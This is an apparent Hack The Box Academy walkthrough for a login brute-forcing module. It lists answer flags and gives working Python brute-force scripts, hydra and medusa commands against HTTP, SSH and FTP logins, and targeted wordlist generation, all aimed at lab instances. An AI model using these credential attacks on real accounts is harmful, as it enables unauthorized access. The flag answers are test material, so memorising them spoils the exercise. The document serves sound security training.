![[cheatsheat-Login Brute Forcing]]

## Section Questions and their Answers

|Section|Question Number|Answer|
|---|---|---|
|Brute Force Attacks|Question 1|HTB{Brut3_F0rc3_1s_P0w3rfu1}|
|Dictionary Attacks|Question 1|HTB{Brut3_F0rc3_M4st3r}|
|Basic HTTP Authentication|Question 1|HTB{th1s_1s_4_f4k3_fl4g}|
|Login Forms|Question 1|HTB{W3b_L0gin_Brut3F0rc3}|
|Web Services|Question 1|qqww1122|
|Web Services|Question 2|HTB{SSH_and_FTP_Bruteforce_Success}|
|Custom Wordlists|Question 1|HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}|
|Skills Assessment Part 1|Question 1|Admin123|
|Skills Assessment Part 1|Question 2|satwossh|
|Skills Assessment Part 2|Question 1|thomas|
|Skills Assessment Part 2|Question 2|HTB{brut3f0rc1ng_succ3ssful}|

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# Brute Force Attacks

## Question 1

### "After successfully brute-forcing the PIN, what is the full flag the script returns?"

After spawning the target, students will save the following Python3 PIN brute-force script as `solver.py` based on their STMIP and STMPO in the `ip` and `port` variables:

Code: python3

```python3
import requests

ip = "STMIP"  # Change this to your instance IP address
port = STMPO       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    
    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

Subsequently, students will run the script and will attain the correct PIN code and gain the flag:

Code: shell

```shell
python3 solver.py
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-vxsusos1qt]─[~]
└──╼ [★]$ python3 solver.py 

Correct PIN found: 3424
Flag: {hidden}
```

Answer: `HTB{Brut3_F0rc3_1s_P0w3rfu1}`

# Dictionary Attacks

## Question 1

### "After successfully brute-forcing the target using the script, what is the full flag the script returns?"

After spawning the target, students will save the following Python3 PIN brute-force script as `solver.py` based on their STMIP and STMPO in the `ip` and `port` variables:

Code: python3

```python3
import requests

ip = "STMIP"  # Change this to your instance IP address
port = STMPO       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    
    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break

```

Subsequently, students will run the script and will attain the correct password and gain the flag:

Code: shell

```shell
python3 solver.py
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-vxsusos1qt]─[~]
└──╼ [★]$ python3 solver.py 

Correct password found: gateway
Flag: {hidden}
```

Answer: `HTB{Brut3_F0rc3_M4st3r}`

# Basic HTTP Authentication

## Question 1

### "After successfully brute-forcing, and then logging into the target, what is the full flag you find?"

After spawning the target, students will use `hydra` to brute-force the log-in of the `basic-auth-user` found in the section and download the wordlist `2023-200_most_used_passwords.txt`, which will be used as a dictionary for the password:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt STMIP http-get / -s STMPO
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-5gy2c284c4]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt

┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-5gy2c284c4]─[~]
└──╼ [★]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 94.237.54.201 http-get / -s 52992

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-30 01:09:54
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
[DATA] attacking http-get://94.237.54.201:52992/
[52992][http-get] host: 94.237.54.201   login: basic-auth-user   password: Password@123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-30 01:09:55
```

Subsequently, students will use `cURL` and the `-u` option, specifying the HTTP basic authentication using the found credentials and will grep for the string `HTB{` and attain the flag in the `<span>` HTML tag:

Code: shell

```shell
curl http://STMIP:STMPO -u "basic-auth-user:Password@123" | grep HTB{
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-5gy2c284c4]─[~]
└──╼ [★]$ curl http://94.237.54.201:52992 -u "basic-auth-user:Password@123" | grep HTB{

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   917  100   917    0     0  27371      0 --:--:-- --:--:-- --:--:-- 27787
    <p>You found the flag: <span class="flag">{hidden}</span></p>
```

Answer: `HTB{th1s_1s_4_f4k3_fl4g}`

# Login Forms

## Question 1

### "After successfully brute-forcing, and then logging into the target, what is the full flag you find?"

After spawning the target, students will open `Firefox` and will navigate to the target's page. They will presented with a log-in form, and students will submit any credentials (`htb-student:htb-student`) to get the failure condition for `hydra`.

![Login_Brute_Forcing_Walkthrough_Image_1.png](https://academy.hackthebox.com/storage/walkthroughs/51/Login_Brute_Forcing_Walkthrough_Image_1.png)

Students will open a terminal and send a GET request using `cURL` to the target to obtain the web page's source code and the respective input fields of `username` and `password`.

Code: shell

```shell
curl http://STMIP:STMPO | tail -11
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-yx6y8ivwpr]─[~]
└──╼ [★]$ curl http://94.237.54.201:30800/ | tail -11

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2413  100  2413    0     0  53514      0 --:--:-- --:--:-- --:--:-- 53622
    <form method="POST">
        <h2>Login</h2>
        <label for="username">Username:</label>
        <input type="text" id="username" name="username">
        <label for="password">Password:</label>
        <input type="password" id="password" name="password">
        <input type="submit" value="Login">
        
    </form>
</body>
</html>
```

Subsequently, students will download the `top-usernames-shortlist.txt` and `2023-200_most_used_passwords.txt` wordlists:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-yx6y8ivwpr]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt

┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-yx6y8ivwpr]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
```

Students will use `hydra` to perform a log-in brute-force using the `top-usernames-shortlist.txt` as the username list and `2023-200_most_used_passwords.txt` as the password list and the failure condition:

Code: shell

```shell
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f STMIP -s STMPO http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-yx6y8ivwpr]─[~]
└──╼ [★]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 94.237.54.201 -s 30800 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-30 02:17:21
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
[DATA] attacking http-post-form://94.237.54.201:30800/:username=^USER^&password=^PASS^:F=Invalid credentials
[30800][http-post-form] host: 94.237.54.201   login: admin   password: zxcvbnm
[STATUS] attack finished for 94.237.54.201 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-30 02:17:30
```

Students will return to the log-in page and use credentials (`admin:zxcvbnm`) to log in and attain the flag.

![Login_Brute_Forcing_Walkthrough_Image_2.png](https://academy.hackthebox.com/storage/walkthroughs/51/Login_Brute_Forcing_Walkthrough_Image_2.png)

Answer: `HTB{W3b_L0gin_Brut3F0rc3}`

# Web Services

## Question 1

### "What was the password for the ftpuser?"

After spawning the target, students will install `medusa` using the apt repository:

Code: shell

```shell
sudo apt install medusa
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-sbvtgbegel]─[~]
└──╼ [★]$ sudo apt install medusa

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done

<SNIP>

Launchers are updated
```

Subsequently, students will download the `2023-200_most_used_passwords.txt` wordlist:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-sbvtgbegel]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
```

Students will use `medusa` to perform an SSH brute-force against the `sshuser` from the section using the downloaded wordlist:

Code: shell

```shell
medusa -h STMIP -n STMPO -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-sbvtgbegel]─[~]
└──╼ [★]$ medusa -h 83.136.255.143 -n 34377 -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

<SNIP>

ACCOUNT CHECK: [ssh] Host: 83.136.255.143 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 1q2w3e4r5t (46 of 200 complete)
ACCOUNT FOUND: [ssh] Host: 83.136.255.143 User: sshuser Password: 1q2w3e4r5t [SUCCESS]

<SNIP>
```

Having obtained valid credentials, students will log in via SSH:

Code: shell

```shell
ssh sshuser@STMIP -p STMPO
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-sbvtgbegel]─[~]
└──╼ [★]$ ssh sshuser@83.136.255.143 -p 34377

The authenticity of host '[83.136.255.143]:34377 ([83.136.255.143]:34377)' can't be established.
ED25519 key fingerprint is SHA256:2DP/wThlQCF/4IvGaF49XZcQO0bREny3YAZ1wSonr2g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[83.136.255.143]:34377' (ED25519) to the list of known hosts.
sshuser@83.136.255.143's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.1.0-10-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
sshuser@ng-8414-loginbfservice-of7kt-7fd949d965-pt5d2:~$
```

Subsequently, students will enumerate the services on the machine running locally using `nmap` and discovering an FTP service running on port `21`:

Code: shell

```shell
nmap localhost
```

```shell-session
sshuser@ng-8414-loginbfservice-of7kt-7fd949d965-pt5d2:~$ nmap localhost

Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-30 08:29 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00011s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
```

Students will perform a brute-force against the FTP service, targeting the `ftpuser` user using the `2020-200_most_used_passwords.txt` wordlist located in the `/home/sshuser` directory using medusa:

Code: shell

```shell
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

```shell-session
sshuser@ng-8414-loginbfservice-of7kt-7fd949d965-pt5d2:~$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

<SNIP>

ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: ftpuser (1 of 1, 0 complete) Password: qqww1122 (16 of 197 complete)
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ftpuser Password: {hidden} [SUCCESS]
ACCOUNT CHECK: [ftp] Host: 127.0.0.1 (1 of 1, 0 complete) User: ftpuser (1 of 1, 1 complete) Password: 1234 (17 of 197 complete)

<SNIP>
```

Answer: `qqww1122`

# Web Services

## Question 2

### "After successfully brute-forcing the ssh session, and then logging into the ftp server on the target, what is the full flag found within flag.txt?"

Students will reuse the previously established SSH session and will connect to the FTP service using the previously found password:

Code: shell

```shell
ftp ftp://ftpuser:qqww1122@localhost
```

```shell-session
sshuser@ng-8414-loginbfservice-of7kt-7fd949d965-pt5d2:~$ ftp ftp://ftpuser:qqww1122@localhost

Trying [::1]:21 ...
Connected to localhost.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp>
```

Subsequently, students will query the files on the FTP service and download `flag.txt` to attain the flag:

Code: shell

```shell
ls
get flag.txt
!cat flag.txt
```

```shell-session
ftp> ls
229 Entering Extended Passive Mode (|||51539|)
150 Here comes the directory listing.
-rw-------    1 1001     1001           35 Sep 30 08:06 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||33265|)
150 Opening BINARY mode data connection for flag.txt (35 bytes).
100% |*************************************************************************************************************************************************|    35       31.01 KiB/s    00:00 ETA
226 Transfer complete.
35 bytes received in 00:00 (26.95 KiB/s)
ftp> !cat flag.txt
{hidden}
```

Answer: `HTB{SSH_and_FTP_Bruteforce_Success}`

# Custom Wordlists

## Question 1

### "After successfully brute-forcing, and then logging into the target, what is the full flag you find?"

After spawning the target, students will proceed to install `cupp` and clone `username-anarchy`:

Code: shell

```shell
sudo apt install cupp -y
git clone https://github.com/urbanadventurer/username-anarchy.git
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-rt6zrudlru]─[~]
└──╼ [★]$ sudo apt install cupp -y

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done

<SNIP>

Scanning application launchers
Removing duplicate launchers or broken launchers
Launchers are updated

┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-rt6zrudlru]─[~]
└──╼ [★]$ git clone https://github.com/urbanadventurer/username-anarchy.git

Cloning into 'username-anarchy'...
remote: Enumerating objects: 448, done.
remote: Counting objects: 100% (62/62), done.
remote: Compressing objects: 100% (49/49), done.
remote: Total 448 (delta 29), reused 32 (delta 9), pack-reused 386 (from 1)
Receiving objects: 100% (448/448), 16.79 MiB | 25.51 MiB/s, done.
Resolving deltas: 100% (156/156), done.
```

Subsequently, students will use `username-anarchy` to create a wordlist of possible usernames of `Jane Smith`:

Code: shell

```shell
cd username-anarchy
./username-anarchy Jane Smith > ../jane_smith_usernames.txt
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-rt6zrudlru]─[~]
└──╼ [★]$ cd username-anarchy/

┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-rt6zrudlru]─[~/username-anarchy]
└──╼ [★]$ ./username-anarchy Jane Smith > ../jane_smith_usernames.txt
```

Students will use `cupp` in interactive mode to generate a list of possible passwords:

Code: shell

```shell
cupp -i
Jane
Smith
Janey
11121990
Jim
Jimbo
12121990
Spot
AHI
y
y
y
y
y
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-rt6zrudlru]─[~]
└──╼ [★]$ cupp -i
 ___________ 
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\   
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Jane  
> Surname: Smith
> Nickname: Janey
> Birthdate (DDMMYYYY): 11121990


> Partners) name: Jim
> Partners) nickname: Jimbo
> Partners) birthdate (DDMMYYYY): 12121990


> Child's name: 
> Child's nickname: 
> Child's birthdate (DDMMYYYY): 


> Pet's name: Spot
> Company name: AHI


> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: y
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to jane.txt, counting 43222 words.
[+] Now load your pistolero with jane.txt and shoot! Good luck!
```

After generating the wordlist, students will proceed to truncate it to adhere to a six-character length string (words), that have at least one uppercase letter, one lowercase letter, and two special characters:

Code: shell

```shell
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-rt6zrudlru]─[~]
└──╼ [★]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

Students will use `hydra` to brute-force the `http-post-form` using the `jane_smith_usernames.txt` and `jane-filtered.txt` password lists:

Code: shell

```shell
hydra -L jane_smith_usernames.txt -P jane-filtered.txt STMIP -s STMPO -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-rt6zrudlru]─[~]
└──╼ [★]$ hydra -L jane_smith_usernames.txt -P jane-filtered.txt 94.237.53.113 -s 33384 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-30 05:40:24
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100604 login tries (l:14/p:7186), ~6288 tries per task
[DATA] attacking http-post-form://94.237.53.113:33384/:username=^USER^&password=^PASS^:Invalid credentials
[33384][http-post-form] host: 94.237.53.113   login: jane   password: 3n4J!!
[STATUS] attack finished for 94.237.53.113 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-30 05:40:25
```

After obtaining valid credentials, students will open `Firefox`, navigate to the target, and log in using the credentials (`jane:3n4J!!`) to attain the flag.

![Login_Brute_Forcing_Walkthrough_Image_3.png](https://academy.hackthebox.com/storage/walkthroughs/51/Login_Brute_Forcing_Walkthrough_Image_3.png)

Answer: `HTB{W3b_L0gin_Brut3F0rc3_Cu5t0m}`

# Skills Assessment Part 1

## Question 1

### "What is the password for the basic auth login?"

After spawning the target machine, students will download `top-usernames-shortlist.txt` and `2023-200_most_used_passwords.txt` wordlists:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-guzdqpf4yp]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt

┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-guzdqpf4yp]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
```

Students will use `cURL` to send a GET request to the target and inspect the headers from the response, noticing the usage of basic authentication indicated in the [WWW-Authenticate](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/WWW-Authenticate) header:

Code: shell

```shell
curl -I http://STMIP:STMPO
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-guzdqpf4yp]─[~]
└──╼ [★]$ curl -I http://83.136.254.158:35620

HTTP/1.1 401 Unauthorized
Server: nginx/1.27.1
Date: Mon, 30 Sep 2024 11:23:29 GMT
Content-Type: text/html
Content-Length: 179
Connection: keep-alive
WWW-Authenticate: Basic realm="Restricted"
```

Subsequently, students will use `hydra` to perform brute-forcing using the `http-get` method and the downloaded wordlists to attain a valid username and password:

Code: shell

```shell
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt STMIP http-get / -s STMPO
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-guzdqpf4yp]─[~]
└──╼ [★]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 83.136.254.158 http-get / -s 35620

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-30 06:25:33
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
[DATA] attacking http-get://83.136.254.158:35620/
[35620][http-get] host: 83.136.254.158   login: admin   password: {hidden}
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-30 06:26:01
```

Answer: `Admin123`

# Skills Assessment Part 1

## Question 2

### "After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?"

Students will send a GET request using `cURL` and specify the found credentials (`admin:Admin123`) to attain the username between the `<span>` tag for the second part of the Skills Assessment:

Code: shell

```shell
curl http://STMIP:STMPO -u "admin:Admin123" | tail
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-guzdqpf4yp]─[~]
└──╼ [★]$ curl http://83.136.254.158:35620 -u "admin:Admin123" | tail 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   951  100   951    0     0  27649      0 --:--:-- --:--:-- --:--:-- 27970
        }
    </style>
</head>

<body>
    <h1>Congratulations!</h1>
    <p>This is the username you will need for part 2 of the Skills Assessment<span class="flag">{hidden}</span></p>
</body>

</html>
```

Answer: `satwossh`

# Skills Assessment Part 2

## Question 1

### "What is the username of the ftp user you find via brute-forcing?"

After spawning the target, students will download the `2023-200_most_used_passwords.txt` wordlist:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-guzdqpf4yp]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
```

Subsequently, students will perform an SSH brute-force using the username `satwossh` and the wordlist with hydra to attain the password of the user:

Code: shell

```shell
hydra -l satwossh -P 2023-200_most_used_passwords.txt ssh://STMIP:STMPO
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-guzdqpf4yp]─[~]
└──╼ [★]$ hydra -l satwossh -P 2023-200_most_used_passwords.txt ssh://94.237.56.229:39400

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-30 06:33:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
[DATA] attacking ssh://94.237.56.229:39400/
[39400][ssh] host: 94.237.56.229   login: satwossh   password: password1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-30 06:34:26
```

Students will connect via SSH using the credentials `satwossh:password1`:

Code: shell

```shell
ssh satwossh@STMIP -p STMPO
```

```shell-session
┌─[eu-academy-5]─[10.10.14.51]─[htb-ac-8414@htb-guzdqpf4yp]─[~]
└──╼ [★]$ ssh satwossh@94.237.56.229 -p 39400

The authenticity of host '[94.237.56.229]:39400 ([94.237.56.229]:39400)' can't be established.
ED25519 key fingerprint is SHA256:0ldLAJLTwIrE2wupFhvN1WiHuimct7AF+pBddY5xIi8.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[94.237.56.229]:39400' (ED25519) to the list of known hosts.
satwossh@94.237.56.229's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.1.0-10-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
satwossh@ng-8414-loginbfsatwo-pj3oi-5585b5994f-wh46v:~$
```

Subsequently, students will list the files in the current working directory, finding an `IncidentReport.txt` file holding information about a user (`Thomas Smith`):

Code: shell

```shell
ls
cat IncidentReport.txt
```

```shell-session
satwossh@ng-8414-loginbfsatwo-pj3oi-5585b5994f-wh46v:~$ ls
IncidentReport.txt  passwords.txt  username-anarchy

satwossh@ng-8414-loginbfsatwo-pj3oi-5585b5994f-wh46v:~$ cat IncidentReport.txt 
System Logs - Security Report

Date: 2024-09-06

Upon reviewing recent FTP activity, we have identified suspicious behavior linked to a specific user. The user **Thomas Smith** has been regularly uploading files to the server during unusual hours and has bypassed multiple security protocols. This activity requires immediate investigation.

All logs point towards Thomas Smith being the FTP user responsible for recent questionable transfers. We advise closely monitoring this user’s actions and reviewing any files uploaded to the FTP server.

Security Operations Team
```

Students will utilise `nmap` to scan the host locally and uncover the FTP service running on port `21`:

Code: shell

```shell
nmap localhost
```

```shell-session
satwossh@ng-8414-loginbfsatwo-pj3oi-5585b5994f-wh46v:~$ nmap localhost

Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-30 11:37 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00011s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```

Students need to generate potential usernames for `Thomas Smith` using `username-anarchy`:

Code: shell

```shell
./username-anarchy/username-anarchy Thomas Smith > thomas_smith.txt
```

```shell-session
satwossh@ng-8414-loginbfsatwo-pj3oi-5585b5994f-wh46v:~$ ./username-anarchy/username-anarchy Thomas Smith > thomas_smith.txt
```

Subsequently, students will use `medusa` to perform an FTP brute-force using the previously generated username list and the password list located in the `/home/satwossh` directory to obtain valid credentials:

Code: shell

```shell
medusa -h 127.0.0.1 -U thomas_smith.txt -P passwords.txt -M ftp -t 5 | grep "ACCOUNT FOUND"
```

```shell-session
satwossh@ng-8414-loginbfsatwo-pj3oi-5585b5994f-wh46v:~$ medusa -h 127.0.0.1 -U thomas_smith.txt -P passwords.txt -M ftp -t 5 | grep "ACCOUNT FOUND"

ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: {hidden} Password: chocolate! [SUCCESS]
```

Answer: `thomas`

